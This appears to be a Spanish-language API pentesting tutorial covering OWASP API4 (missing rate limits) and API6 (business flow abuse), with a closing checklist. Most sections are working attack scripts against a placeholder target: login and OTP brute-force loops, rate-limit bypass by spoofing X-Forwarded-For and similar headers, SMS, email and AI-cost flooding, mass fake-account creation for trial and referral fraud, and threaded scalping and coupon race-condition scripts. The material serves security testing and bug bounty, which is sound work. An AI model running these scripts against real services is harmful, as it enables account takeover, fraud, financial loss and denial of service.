# API4 & API6 — Rate Limiting y Business Flow Abuse

### API4 — Unrestricted Resource Consumption

La API no limita el número, tamaño o frecuencia de las peticiones. Sin rate limiting un atacante puede abusar de la API para:

```
→ Bruteforce de credenciales sin lockout
→ Enumeración masiva (todos los IDs, todos los usuarios)
→ DoS — saturar el servidor con peticiones
→ Abuso de costes en APIs que usan recursos de pago (SMS, email, GPT...)
→ Scraping completo de la base de datos
→ Explotación de lógica de negocio a escala
```

#### Detectar ausencia de rate limiting

```bash
# Herramienta simple: enviar N peticiones y ver si hay 429
for i in $(seq 1 100); do
    curl -s -o /dev/null -w "%{http_code}\n" \
        -X POST https://target.com/api/auth/login \
        -H "Content-Type: application/json" \
        -d '{"email":"test@test.com","password":"wrongpass"}'
done
# Si todos devuelven 401 (no 429 ni delay progresivo) → sin rate limiting

# Con Python — medir también el tiempo de respuesta
import requests, time

url = "https://target.com/api/auth/login"
for i in range(50):
    start = time.time()
    r = requests.post(url, json={"email": "test@test.com", "password": f"pass{i}"})
    elapsed = time.time() - start
    print(f"[{i+1}] Status: {r.status_code} | Time: {elapsed:.2f}s")
    # Si el tiempo se va incrementando → hay rate limiting basado en delay
    # Si siempre es el mismo y nunca hay 429 → sin rate limiting

# Con Burp Intruder + grep
# 1. Send to Intruder → marcar §password§
# 2. Payload: lista de 100 contraseñas
# 3. Analizar columna "Status" → ¿hay algún 429?
# 4. Analizar columna "Response time" → ¿hay incremento progresivo?
```

#### Endpoints críticos sin rate limiting

```bash
# Login → bruteforce de credenciales
POST /api/auth/login
POST /api/auth/signin
POST /api/v1/token

# Registro → crear cuentas masivas (abuso de recursos, spam)
POST /api/auth/register
POST /api/users

# Password reset → flood de emails / enumeración de usuarios
POST /api/auth/forgot-password
POST /api/auth/reset-password

# OTP / 2FA → bruteforce del código de 6 dígitos (solo 1.000.000 posibilidades)
POST /api/auth/verify-otp
POST /api/auth/2fa/verify

# Envío de mensajes / emails → spam
POST /api/messages/send
POST /api/notifications/send

# Verificación de existencia → enumeración masiva
GET /api/users/check?email=victim@test.com
GET /api/users/{id}

# Operaciones costosas en el servidor (IA, procesamiento, exports)
POST /api/ai/generate
POST /api/reports/export
POST /api/images/process
```

#### Bypass de rate limiting

```bash
# Si hay rate limiting, intentar bypasses:

# 1. Cambiar la IP con X-Forwarded-For
# Muchas APIs aplican rate limiting por IP y confían en este header
curl -H "X-Forwarded-For: $(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1)" \
    -X POST https://target.com/api/auth/login \
    -d '{"email":"test@test.com","password":"pass"}'

# Headers alternativos para IP spoofing
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
CF-Connecting-IP: 1.2.3.4
True-Client-IP: 1.2.3.4

# 2. Cambiar User-Agent en cada petición
# Si el rate limit es por User-Agent (raro pero existe)
user_agents=("Mozilla/5.0" "curl/7.85" "PostmanRuntime/7.32" "python-requests/2.28")

# 3. Añadir un parámetro aleatorio para que cada petición sea "única"
POST /api/auth/login?_=RANDOM_VALUE
POST /api/auth/login
{"email":"test@test.com","password":"pass","_noise": "random123"}

# 4. Cambiar capitalización/formato del email
# test@test.com, Test@test.com, TEST@test.com, test+1@test.com...
# Algunos sistemas tratan estos como emails distintos

# 5. Peticiones en paralelo (race window)
# Enviar N peticiones exactamente al mismo tiempo antes de que el contador se actualice
python3 -c "
import requests, concurrent.futures

def send(i):
    return requests.post('https://target.com/api/auth/login',
        json={'email': 'test@test.com', 'password': f'pass{i}'})

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
    results = list(ex.map(send, range(50)))
print([r.status_code for r in results])
"
```

#### Abuso de recursos de pago (API key abuse)

```bash
# Si la app usa servicios de pago por uso (SMS, email, GPT, OCR...)
# Sin rate limiting, un atacante puede generar costes masivos

# Flood de SMS OTP (cada SMS cuesta ~0.01€)
for i in $(seq 1 1000); do
    curl -X POST https://target.com/api/auth/send-sms-otp \
        -d '{"phone": "+34666000001"}' &
done
# 1000 SMS × 0.01€ = 10€ de daño con 1000 peticiones
# Escalar a 100.000 peticiones = 1.000€

# Flood de emails
for i in $(seq 1 10000); do
    curl -X POST https://target.com/api/auth/forgot-password \
        -d '{"email": "victim@test.com"}' &
done

# Abuso de APIs de IA (coste por tokens)
for i in $(seq 1 1000); do
    curl -X POST https://target.com/api/ai/generate \
        -d '{"prompt": "Escribe una historia de 10000 palabras..."}' &
done
```

### API6 — Unrestricted Access to Sensitive Business Flows

#### ¿Qué es?

La API no protege flujos de negocio críticos contra el abuso automatizado. A diferencia de API4 (que es sobre recursos del servidor), API6 es sobre **lógica de negocio** que puede explotarse si se automatiza.

```
Ejemplos reales:
→ Comprar 1000 unidades de un producto con stock limitado (scalping)
→ Crear 10.000 cuentas para abusar de períodos de prueba gratuitos
→ Canjear el mismo cupón de descuento 1000 veces
→ Votar 10.000 veces en una encuesta
→ Hacer 10.000 reservas de eventos con entradas limitadas
→ Referir 1000 amigos falsos para obtener créditos
```

***

#### Identificar flujos de negocio abusables

```bash
# Flujos con valor económico o de escasez:
→ Checkout / compra de productos (especialmente con stock limitado)
→ Registro + período de prueba gratuito
→ Sistemas de referidos / afiliados
→ Cupones de descuento / códigos promocionales
→ Votaciones / ratings / likes
→ Reservas de plazas limitadas
→ Solicitudes de crédito / préstamos
→ Sorteos / concursos
→ Sistemas de puntos / recompensas
→ Invitaciones a beta / lista de espera
```

#### Técnicas de explotación

**Compra de productos con stock limitado**

```python
# Comprar artículos de edición limitada antes de que se agoten
# (o revenderlos a mayor precio)

import requests, threading

HEADERS = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}

def comprar(i):
    r = requests.post("https://target.com/api/orders",
        headers=HEADERS,
        json={"product_id": 999, "quantity": 1, "payment_method": "card_123"})
    print(f"[{i}] {r.status_code}: {r.json().get('order_id', r.text[:50])}")

# Lanzar 100 peticiones simultáneas
with threading.ThreadPoolExecutor(max_workers=100) as ex:
    list(ex.map(comprar, range(100)))
```

**Abuso de período de prueba gratuito**

```python
# Crear 1000 cuentas con emails temporales para obtener 1000 períodos de prueba
import requests

for i in range(1000):
    email = f"user{i}@tempmail{i}.com"  # o usar API de email temporal
    r = requests.post("https://target.com/api/register",
        json={"email": email, "password": "Pass123!", "name": f"User {i}"})
    if r.status_code == 201:
        token = r.json().get("token")
        # Usar el servicio premium durante el trial, luego repetir con otra cuenta
        print(f"[+] Trial obtenido: {email}")
```

**Abuso de sistema de referidos**

```python
# Si referir amigos da créditos:
# Crear N cuentas y hacer que todas "refieran" a la cuenta principal

import requests

MAIN_ACCOUNT = "main@attacker.com"
REFERRAL_CODE = "REF123"  # Código de referido de la cuenta principal

for i in range(500):
    # Crear cuenta nueva con el código de referido
    r = requests.post("https://target.com/api/register",
        json={
            "email": f"fake{i}@tempmail.com",
            "password": "Pass123!",
            "referral_code": REFERRAL_CODE  # ← aplica el referido
        })
    # Cada registro acredita a la cuenta principal
    print(f"[{i}] {r.status_code}")
```

**Race condition en cupones de descuento**

```python
# Un cupón de un solo uso puede canjearse múltiples veces con race condition
# Enviar muchas peticiones en paralelo antes de que el servidor marque el cupón como usado

import requests, concurrent.futures

HEADERS = {"Authorization": "Bearer TOKEN"}
COUPON = "DESCUENTO50"

def apply_coupon():
    return requests.post("https://target.com/api/cart/apply-coupon",
        headers=HEADERS,
        json={"coupon_code": COUPON})

# Enviar 20 peticiones simultáneas
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    results = list(ex.map(lambda _: apply_coupon(), range(20)))

for r in results:
    if r.status_code == 200:
        print(f"[+] Cupón aplicado: {r.json()}")
```

#### Race Conditions en APIs

Las race conditions merecen mención especial porque son la causa de muchos abusos de lógica de negocio:

```
Flujo vulnerable:
1. Verificar saldo: saldo = 100€
2. Verificar que el pedido cuesta ≤ saldo: 80€ ≤ 100€ ✅
3. Procesar pago: saldo -= 80 → 20€
4. Confirmar pedido

Si dos peticiones de 80€ se procesan simultáneamente:
→ Petición A: paso 1 → saldo = 100€
→ Petición B: paso 1 → saldo = 100€ (antes de que A lo actualice)
→ Petición A: paso 2 → 80 ≤ 100 ✅
→ Petición B: paso 2 → 80 ≤ 100 ✅ (todavía no se actualizó)
→ Petición A: paso 3 → saldo = 20€
→ Petición B: paso 3 → saldo = -60€ ← gasto más de lo que tenía
```

```python
# Detectar race conditions con Turbo Intruder (Burp Suite)
# Enviar N peticiones en la misma ventana de tiempo

# Script para Turbo Intruder:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=20,
                          requestsPerConnection=1,
                          pipeline=False)
    for i in range(20):
        engine.queue(target.req, pauseTime=0)

def handleResponse(req, interesting):
    if req.status == 200:
        table.add(req)
```

### Checklist API4 & API6

```
Rate Limiting (API4):
□ Enviar 100 peticiones al endpoint de login → ¿hay 429?
□ Probar bruteforce de OTP/2FA (10.000 posibilidades si es 4 dígitos, 1M si es 6)
□ Enviar 50 peticiones de reset de contraseña → ¿flood de emails?
□ Probar bypass de rate limit: X-Forwarded-For, User-Agent, parámetros noise
□ Verificar si hay incremento de delay o solo 429 puro
□ Probar enumeración masiva de IDs sin rate limiting

Business Flow (API6):
□ Identificar flujos con valor económico (compras, trials, referidos, cupones)
□ Intentar canjear el mismo cupón dos veces en rápida sucesión (race condition)
□ Intentar comprar más unidades de las permitidas
□ Probar race condition en saldo/créditos
□ Verificar si el trial se puede obtener con distintos emails del mismo usuario
□ Intentar votar/like múltiples veces el mismo item
```

> Un OTP de 6 dígitos tiene solo 1.000.000 de combinaciones. Sin rate limiting se puede crackear por fuerza bruta en minutos enviando peticiones en paralelo. Es uno de los hallazgos más frecuentes en aplicaciones móviles.

> Turbo Intruder de Burp Suite es la herramienta ideal para race conditions: puede enviar decenas de peticiones idénticas en la misma ventana de tiempo (< 1ms de diferencia), maximizando la probabilidad de que el servidor las procese en paralelo.

> Los ataques de API6 pueden tener impacto económico real para la empresa (costes de SMS, fraude en descuentos, stock robado). En bug bounty, demostrar el concepto con 2-3 peticiones es suficiente para el reporte — no hace falta agotar el stock real.
